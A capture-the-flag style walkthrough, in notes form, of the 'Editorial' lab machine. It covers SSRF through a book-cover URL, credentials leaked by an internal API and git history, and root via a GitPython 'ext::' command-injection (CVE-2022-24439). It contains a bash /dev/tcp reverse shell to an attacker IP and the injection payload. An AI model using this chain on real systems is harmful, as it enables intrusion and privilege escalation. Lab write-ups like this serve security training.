@@ -1,0 +1,622 @@
+
+
+
+
+we see that SSRF is possible through their publish book page
+specifically the cover url
+We use burp intruder with a wordlist such as 
+Discovery/Infrastructure/common-http-ports.txt
+
+we find on port 5000
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat cfefb261-351a-4168-9ba6-6e8ae9fad73b 
+{"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}
+                                                                                                                     
+we get these enpoints by visiting the same page and going to 
+
+http://127.0.0.1:5000/api/latest/metadata/messages/authors
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat Downloads/96fd0786-e0f3-4691-ae10-5de522b76dec 
+{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}
+
+
+credentials
+
+username: dev
+password: dev080217_devAPI!@
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh dev@10.10.11.20                 
+The authenticity of host '10.10.11.20 (10.10.11.20)' can't be established.
+ED25519 key fingerprint is SHA256:YR+ibhVYSWNLe4xyiPA0g45F4p1pNAcQ7+xupfIR70Q.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.20' (ED25519) to the list of known hosts.
+dev@10.10.11.20's password: 
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Mon Aug 25 04:31:34 AM UTC 2025
+
+  System load:           0.08
+  Usage of /:            60.4% of 6.35GB
+  Memory usage:          12%
+  Swap usage:            0%
+  Processes:             226
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.20
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:138b
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Mon Jun 10 09:11:03 2024 from 10.10.14.52
+dev@editorial:~$ ls -la
+total 32
+drwxr-x--- 4 dev  dev  4096 Jun  5  2024 .
+drwxr-xr-x 4 root root 4096 Jun  5  2024 ..
+drwxrwxr-x 3 dev  dev  4096 Jun  5  2024 apps
+lrwxrwxrwx 1 root root    9 Feb  6  2023 .bash_history -> /dev/null
+-rw-r--r-- 1 dev  dev   220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 dev  dev  3771 Jan  6  2022 .bashrc
+drwx------ 2 dev  dev  4096 Jun  5  2024 .cache
+-rw-r--r-- 1 dev  dev   807 Jan  6  2022 .profile
+-rw-r----- 1 root dev    33 Aug 25 02:49 user.txt
+
+
+dev@editorial:~/apps$ ls -la
+total 12
+drwxrwxr-x 3 dev dev 4096 Jun  5  2024 .
+drwxr-x--- 4 dev dev 4096 Jun  5  2024 ..
+drwxr-xr-x 8 dev dev 4096 Jun  5  2024 .git
+dev@editorial:~/apps$ ls -lRA
+.:
+total 4
+drwxr-xr-x 8 dev dev 4096 Jun  5  2024 .git
+
+./.git:
+total 48
+drwxr-xr-x  2 dev dev 4096 Jun  5  2024 branches
+-rw-r--r--  1 dev dev  253 Jun  4  2024 COMMIT_EDITMSG
+-rw-r--r--  1 dev dev  177 Jun  4  2024 config
+-rw-r--r--  1 dev dev   73 Jun  4  2024 description
+-rw-r--r--  1 dev dev   23 Jun  4  2024 HEAD
+drwxr-xr-x  2 dev dev 4096 Jun  5  2024 hooks
+-rw-r--r--  1 dev dev 6163 Jun  4  2024 index
+drwxr-xr-x  2 dev dev 4096 Jun  5  2024 info
+drwxr-xr-x  3 dev dev 4096 Jun  5  2024 logs
+drwxr-xr-x 70 dev dev 4096 Jun  5  2024 objects
+drwxr-xr-x  4 dev dev 4096 Jun  5  2024 refs
+
+./.git/branches:
+total 0
+
+./.git/hooks:
+total 60
+-rwxr-xr-x 1 dev dev  478 Jun  4  2024 applypatch-msg.sample
+-rwxr-xr-x 1 dev dev  896 Jun  4  2024 commit-msg.sample
+-rwxr-xr-x 1 dev dev 4655 Jun  4  2024 fsmonitor-watchman.sample
+-rwxr-xr-x 1 dev dev  189 Jun  4  2024 post-update.sample
+-rwxr-xr-x 1 dev dev  424 Jun  4  2024 pre-applypatch.sample
+-rwxr-xr-x 1 dev dev 1643 Jun  4  2024 pre-commit.sample
+-rwxr-xr-x 1 dev dev  416 Jun  4  2024 pre-merge-commit.sample
+-rwxr-xr-x 1 dev dev 1492 Jun  4  2024 prepare-commit-msg.sample
+-rwxr-xr-x 1 dev dev 1374 Jun  4  2024 pre-push.sample
+-rwxr-xr-x 1 dev dev 4898 Jun  4  2024 pre-rebase.sample
+-rwxr-xr-x 1 dev dev  544 Jun  4  2024 pre-receive.sample
+-rwxr-xr-x 1 dev dev 2783 Jun  4  2024 push-to-checkout.sample
+-rwxr-xr-x 1 dev dev 3650 Jun  4  2024 update.sample
+
+./.git/info:
+total 4
+-rw-r--r-- 1 dev dev 240 Jun  4  2024 exclude
+
+./.git/logs:
+total 8
+-rw-r--r-- 1 dev dev 1033 Jun  4  2024 HEAD
+drwxr-xr-x 3 dev dev 4096 Jun  5  2024 refs
+
+./.git/logs/refs:
+total 4
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 heads
+
+./.git/logs/refs/heads:
+total 4
+-rw-r--r-- 1 dev dev 1033 Jun  4  2024 master
+
+./.git/objects:
+total 272
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 0a
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 0d
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 10
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 13
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 14
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 1d
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 1e
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 24
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 28
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 2e
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 2f
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 32
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 33
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 34
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 39
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 3a
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 3e
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 3f
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 47
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 48
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 56
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 58
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 5f
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 61
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 63
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 66
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 69
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 6e
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 79
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 7c
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 83
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 85
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 8a
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 8b
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 8f
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 97
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 98
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 99
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 9b
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 9c
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 9d
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 a3
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 a6
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 ae
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 b1
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 b5
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 b7
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 b9
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 ba
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 be
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 bf
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 c5
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 c7
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 c8
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 cd
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 d0
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 d3
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 d4
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 da
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 db
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 de
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 df
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 f0
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 f2
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 f3
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 fe
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 info
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 pack
+
+./.git/objects/0a:
+total 4
+-r--r--r-- 1 dev dev 116 Jun  4  2024 1dd9104faef86f2d8dce88d68fe5263d1e11c5
+
+./.git/objects/0d:
+total 4
+-r--r--r-- 1 dev dev 117 Jun  4  2024 a07d6dbf19e504be3274e4bbbc2fba9195bba7
+
+./.git/objects/10:
+total 96
+-r--r--r-- 1 dev dev 94905 Jun  4  2024 740b9d8aa5c570e6f03cf8afcaf4041484e04f
+
+./.git/objects/13:
+total 36
+-r--r--r-- 1 dev dev 36698 Jun  4  2024 59b3b7215e4fbbf90ff0c958363deae9b66918
+
+./.git/objects/14:
+total 4
+-r--r--r-- 1 dev dev 2517 Jun  4  2024 a8fb7611264fb08bcb6ead8e66e4bd96c99517
+
+./.git/objects/1d:
+total 608
+-r--r--r-- 1 dev dev  28017 Jun  4  2024 138863be69303362e79fcf5cfabfa07650a583
+-r--r--r-- 1 dev dev     83 Jun  4  2024 1be436bfb2b2c224584a10df121adc10d20cf0
+-r--r--r-- 1 dev dev 583816 Jun  4  2024 635dd1e2029225531d0be9841cd29c564240bd
+
+./.git/objects/1e:
+total 4
+-r--r--r-- 1 dev dev 242 Jun  4  2024 84a036b2f33c59e2390730699a488c65643d28
+
+./.git/objects/24:
+total 4
+-r--r--r-- 1 dev dev 2841 Jun  4  2024 5c0dc0de95476f3bfc8b77cd52c6cd1cd71dda
+
+./.git/objects/28:
+total 16
+-r--r--r-- 1 dev dev 12782 Jun  4  2024 cedbd5ebd3993066839e8fa16c1a95d86a4c92
+
+./.git/objects/2e:
+total 12
+-r--r--r-- 1 dev dev 9649 Jun  4  2024 401cf282505f9d0397b9b8fd42900f246ae718
+
+./.git/objects/2f:
+total 52
+-r--r--r-- 1 dev dev   882 Jun  4  2024 0912e802c79a036a442067bf4f0c4e6ef7bc56
+-r--r--r-- 1 dev dev 45273 Jun  4  2024 92d251dc236710cab43e2529c26afff999150c
+
+./.git/objects/32:
+total 4
+-r--r--r-- 1 dev dev 245 Jun  4  2024 51ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
+
+./.git/objects/33:
+total 24
+-r--r--r-- 1 dev dev   950 Jun  4  2024 73b149c99fa082387139a290d7ea88b126e02d
+-r--r--r-- 1 dev dev 20478 Jun  4  2024 cdee9403b5366bd868b1cb5817cfb142c68b47
+
+./.git/objects/34:
+total 4
+-r--r--r-- 1 dev dev 51 Jun  4  2024 2c4d8844e11506e6c182fc4bc51bfce4217404
+
+./.git/objects/39:
+total 28
+-r--r--r-- 1 dev dev 28410 Jun  4  2024 6b607fbefe4eae9368c6294c1891f4c84a6b4d
+
+./.git/objects/3a:
+total 28
+-r--r--r-- 1 dev dev 24630 Jun  4  2024 95aa82a1e7622c8365df550de916a93dd92420
+
+./.git/objects/3e:
+total 12
+-r--r--r-- 1 dev dev 11261 Jun  4  2024 1bb2bba68fd9c1798b02acc15de79d0296f07d
+
+./.git/objects/3f:
+total 12
+-r--r--r-- 1 dev dev 11283 Jun  4  2024 7fb426f88f6f7a6d6432456a2f1dbc4c1cc08e
+
+./.git/objects/47:
+total 56
+-r--r--r-- 1 dev dev 56909 Jun  4  2024 e85e41b0e5b215922821b54785f68c8d36d92d
+
+./.git/objects/48:
+total 8
+-r--r--r-- 1 dev dev 1439 Jun  4  2024 55487e09441d7ecbb88be519173cf70e640498
+-r--r--r-- 1 dev dev   82 Jun  4  2024 fb39e473de06145ef23dc1f8837e17cd9eccb9
+
+./.git/objects/56:
+total 72
+-r--r--r-- 1 dev dev 70439 Jun  4  2024 562c9099057f5ffcdfb1f9736173f08743e5d8
+
+./.git/objects/58:
+total 132
+-r--r--r-- 1 dev dev 133117 Jun  4  2024 f9e7bb8f7b558f59b451225e5c6ee3b4b2556a
+
+./.git/objects/5f:
+total 44
+-r--r--r-- 1 dev dev 41362 Jun  4  2024 67c086a18f782c049da0e7680b6273a602233b
+
+./.git/objects/61:
+total 4
+-r--r--r-- 1 dev dev 958 Jun  4  2024 b786f18cbfa7181041a4b59a4cd1b5b681050e
+
+./.git/objects/63:
+total 2632
+-r--r--r-- 1 dev dev 2694782 Jun  4  2024 1f0b270445c0abe4e064528ad22ef51c9e3f78
+
+./.git/objects/66:
+total 40
+-r--r--r-- 1 dev dev 37243 Jun  4  2024 a976be26d6951e0700fd167abc43e26948258e
+
+./.git/objects/69:
+total 108
+-r--r--r-- 1 dev dev 107569 Jun  4  2024 926c2e5148f2fa83295f564bdee7ee3b1b9914
+
+./.git/objects/6e:
+total 4
+-r--r--r-- 1 dev dev 82 Jun  4  2024 60bbedbe4de61dc98040a476f999d64d9ffac3
+
+./.git/objects/79:
+total 112
+-r--r--r-- 1 dev dev 111772 Jun  4  2024 cf6081979677b0be3635f1dbefff3878064fbe
+
+./.git/objects/7c:
+total 4
+-r--r--r-- 1 dev dev 55 Jun  4  2024 7adf527f67503ab6074f7c4973f4148fb2061c
+
+./.git/objects/83:
+total 20
+-r--r--r-- 1 dev dev 19708 Jun  4  2024 6e1768a26bbbf7cb8077f4aceb5513762ff008
+
+./.git/objects/85:
+total 28
+-r--r--r-- 1 dev dev 24743 Jun  4  2024 798a3a4af308febf52f4bc40deb69f07f637d2
+
+./.git/objects/8a:
+total 4
+-r--r--r-- 1 dev dev 184 Jun  4  2024 d0f3187e2bda88bba85074635ea942974587e8
+
+./.git/objects/8b:
+total 4
+-r--r--r-- 1 dev dev 117 Jun  4  2024 321dcf5232805d66c78383cce28f69c0833939
+
+./.git/objects/8f:
+total 28
+-r--r--r-- 1 dev dev 28423 Jun  4  2024 3742cbd4ddca83323cee29e59f217b49c8a086
+
+./.git/objects/97:
+total 4
+-r--r--r-- 1 dev dev 154 Jun  4  2024 5423ce1166c414d33b42e81ad03028b66c4849
+
+./.git/objects/98:
+total 140
+-r--r--r-- 1 dev dev 95231 Jun  4  2024 4200d680eb17d5fe8deda12e1804698823e123
+-r--r--r-- 1 dev dev 41317 Jun  4  2024 6dafea027e6725cf644d1f9fd8b7d062a59cdc
+
+./.git/objects/99:
+total 16
+-r--r--r-- 1 dev dev 13169 Jun  4  2024 5661774cfea3c3779d67282bf5a9bca928ca5a
+
+./.git/objects/9b:
+total 12
+-r--r--r-- 1 dev dev 11785 Jun  4  2024 2900b89cc461033a9300f6ff3a78d24307c677
+
+./.git/objects/9c:
+total 4
+-r--r--r-- 1 dev dev 1447 Jun  4  2024 b011763bc05e38fe52bb9b3a5c935b50b64704
+
+./.git/objects/9d:
+total 4
+-r--r--r-- 1 dev dev 940 Jun  4  2024 7e1d5d6e73e37efefbee914ad7a6d5b0beb18b
+
+./.git/objects/a3:
+total 44
+-r--r--r-- 1 dev dev 41326 Jun  4  2024 a5682842d9f246ff2cb38a5ce2520c68204a85
+
+./.git/objects/a6:
+total 4
+-r--r--r-- 1 dev dev 353 Jun  4  2024 d552a3055210a82b26299f6c71d6b9d34b8b71
+
+./.git/objects/ae:
+total 4
+-r--r--r-- 1 dev dev 1439 Jun  4  2024 abbbc4e3af6bf60cf43f2cf2d9da0014c94e01
+
+./.git/objects/b1:
+total 4
+-r--r--r-- 1 dev dev 2580 Jun  4  2024 156f95b413b6e102e3f1cc00d2ee3fbc792506
+
+./.git/objects/b5:
+total 136
+-r--r--r-- 1 dev dev 136523 Jun  4  2024 7138bf67ab7d0fe9026e7820e5dcd3a4e32d16
+
+./.git/objects/b7:
+total 140
+-r--r--r-- 1 dev dev    212 Jun  4  2024 3481bb823d2dfb49c44f4c1e6a7e11912ed8ae
+-r--r--r-- 1 dev dev 136432 Jun  4  2024 64603ac837d5d98c14ff82011c2e75ccc52de4
+
+./.git/objects/b9:
+total 4
+-r--r--r-- 1 dev dev 83 Jun  4  2024 05e69865d5529953006fe8d779678637bab560
+
+./.git/objects/ba:
+total 4
+-r--r--r-- 1 dev dev 1200 Jun  4  2024 ef6425509ecc77f881acaf8d76e19d2c66ef17
+
+./.git/objects/be:
+total 4
+-r--r--r-- 1 dev dev 118 Jun  4  2024 47e5183d71ea9c0c750aff864d016edf107722
+
+./.git/objects/bf:
+total 72
+-r--r--r-- 1 dev dev 68691 Jun  4  2024 5c0f3f600bf600712ff9389b88474e9f4bd196
+-r--r--r-- 1 dev dev  2614 Jun  4  2024 e9dc5c89f9930b6622180abe27060e490f97e0
+
+./.git/objects/c5:
+total 4
+-r--r--r-- 1 dev dev 2639 Jun  4  2024 469ae5208ced6910ce88540cdc397c29f4e2c1
+
+./.git/objects/c7:
+total 4
+-r--r--r-- 1 dev dev 51 Jun  4  2024 460e1bc2af4caee07144d0eb1e2c062299c4f0
+
+./.git/objects/c8:
+total 4
+-r--r--r-- 1 dev dev 2832 Jun  4  2024 238cace4ef935949b93b0900f0615678bca2ea
+
+./.git/objects/cd:
+total 204
+-r--r--r-- 1 dev dev  45243 Jun  4  2024 15cfc2feea251b9aead103f0816b9815a90ee3
+-r--r--r-- 1 dev dev 153408 Jun  4  2024 6d8c0061355197c968d553abf3842447a32d90
+-r--r--r-- 1 dev dev    101 Jun  4  2024 d5bc2861285e6a76ea1dd281b1fbf2b262c0a3
+
+./.git/objects/d0:
+total 1236
+-r--r--r-- 1 dev dev 1262141 Jun  4  2024 3c2bb74fda838cb01f5455329d7f71f1529e09
+
+./.git/objects/d3:
+total 4
+-r--r--r-- 1 dev dev 51 Jun  4  2024 ef94c8bf5a7591ea9704c6a11f91d48da8fa8e
+
+./.git/objects/d4:
+total 44
+-r--r--r-- 1 dev dev 41093 Jun  4  2024 734d0b10edb4f812ec7217b8d328eda971858f
+
+./.git/objects/da:
+total 24
+-r--r--r-- 1 dev dev 22832 Jun  4  2024 70ac1f73a9289428c867991880e39192cea745
+
+./.git/objects/db:
+total 12
+-r--r--r-- 1 dev dev 10382 Jun  4  2024 1d97807e60bbfbd8bec7183c9e148f978f0b0a
+
+./.git/objects/de:
+total 40
+-r--r--r-- 1 dev dev 38542 Jun  4  2024 4d5a2ec5ac1c31a5aada2a19494141a0afe694
+
+./.git/objects/df:
+total 4
+-r--r--r-- 1 dev dev 185 Jun  4  2024 ef9f20e57d730b7d71967582035925d57ad883
+
+./.git/objects/f0:
+total 12
+-r--r--r-- 1 dev dev 9651 Jun  4  2024 26a3fe48747334df98f6a011fb626be1e68693
+
+./.git/objects/f2:
+total 24
+-r--r--r-- 1 dev dev 20806 Jun  4  2024 981269f63c1d48379c4a23d9b0c5425a822c28
+
+./.git/objects/f3:
+total 36
+-r--r--r-- 1 dev dev 36688 Jun  4  2024 425530e6b1bc08c8a3495af5be8f4e5a7b050b
+
+./.git/objects/fe:
+total 24
+-r--r--r-- 1 dev dev 10422 Jun  4  2024 d38d45f922c2ae1a0788bd6558f42f21923c25
+-r--r--r-- 1 dev dev 11748 Jun  4  2024 dbacedca988eba5ebb00cd9e1b1057267434ef
+
+./.git/objects/info:
+total 0
+
+./.git/objects/pack:
+total 0
+
+./.git/refs:
+total 8
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 heads
+drwxr-xr-x 2 dev dev 4096 Jun  5  2024 tags
+
+./.git/refs/heads:
+total 4
+-rw-r--r-- 1 dev dev 41 Jun  4  2024 master
+
+./.git/refs/tags:
+total 0
+dev@editorial:~/apps$ git log
+commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
+Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
+Date:   Sun Apr 30 21:04:21 2023 -0500
+
+    fix: bugfix in api port endpoint
+
+commit dfef9f20e57d730b7d71967582035925d57ad883
+Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
+Date:   Sun Apr 30 21:01:11 2023 -0500
+
+    change: remove debug and update api port
+
+commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
+Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
+Date:   Sun Apr 30 20:55:08 2023 -0500
+
+    change(api): downgrading prod to dev
+    
+    * To use development environment.
+
+commit 1e84a036b2f33c59e2390730699a488c65643d28
+Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
+Date:   Sun Apr 30 20:51:10 2023 -0500
+
+    feat: create api to editorial info
+    
+    * It (will) contains internal info about the editorial, this enable
+       faster access to information.
+
+commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
+Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
+Date:   Sun Apr 30 20:48:43 2023 -0500
+
+    feat: create editorial app
+    
+    * This contains the base of this project.
+    * Also we add a feature to enable to external authors send us their
+       books and validate a future post in our editorial.
+dev@editorial:~/apps$ 
+dev@editorial:~/apps$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
+commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
+Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
+Date:   Sun Apr 30 20:55:08 2023 -0500
+
+    change(api): downgrading prod to dev
+    
+    * To use development environment.
+
+diff --git a/app_api/app.py b/app_api/app.py
+index 61b786f..3373b14 100644
+--- a/app_api/app.py
++++ b/app_api/app.py
+@@ -64,7 +64,7 @@ def index():
+ @app.route(api_route + '/authors/message', methods=['GET'])
+ def api_mail_new_authors():
+     return jsonify({
+-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+:
+
+
+credentials
+usernamee: prod
+password: 080217_Producti0n_2023!@
+
+
+
+dev@editorial:~/apps$ su prod
+Password: 
+prod@editorial:/home/dev/apps$ sudo -l
+[sudo] password for prod: 
+Matching Defaults entries for prod on editorial:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User prod may run the following commands on editorial:
+    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
+prod@editorial:/home/dev/apps$ 
+
+prod@editorial:/home/dev/apps$ ls -la /opt/internal_apps/clone_changes/clone_prod_change.py
+-rwxr-x--- 1 root prod 256 Jun  4  2024 /opt/internal_apps/clone_changes/clone_prod_change.py
+prod@editorial:/home/dev/apps$ cat /opt/internal_apps/clone_changes/clone_prod_change.py
+#!/usr/bin/python3
+
+import os
+import sys
+from git import Repo
+
+os.chdir('/opt/internal_apps/clone_changes')
+
+url_to_clone = sys.argv[1]
+
+r = Repo.init('', bare=True)
+r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
+prod@editorial:/home/dev/apps$ 
+
+CVE-2022-24439
+"All versions of package gitpython are vulnerable to Remote Code Execution (RCE) due to improper user input validation, which makes it possible to inject a maliciously crafted remote URL into the clone command. Exploiting this vulnerability is possible because the library makes external calls to git without sufficient sanitization of input arguments."
+
+prod@editorial:/home/dev/apps$ cat > /tmp/shell.sh <<'SH'
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.16/4444 0>&1
+SH
+prod@editorial:/home/dev/apps$ chmod +x /tmp/shell.sh
+prod@editorial:/home/dev/apps$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c '/tmp/shell.sh'"
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 4444                       
+listening on [any] 4444 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.11.20] 47592
+root@editorial:/opt/internal_apps/clone_changes# 
+
+
+
+
+
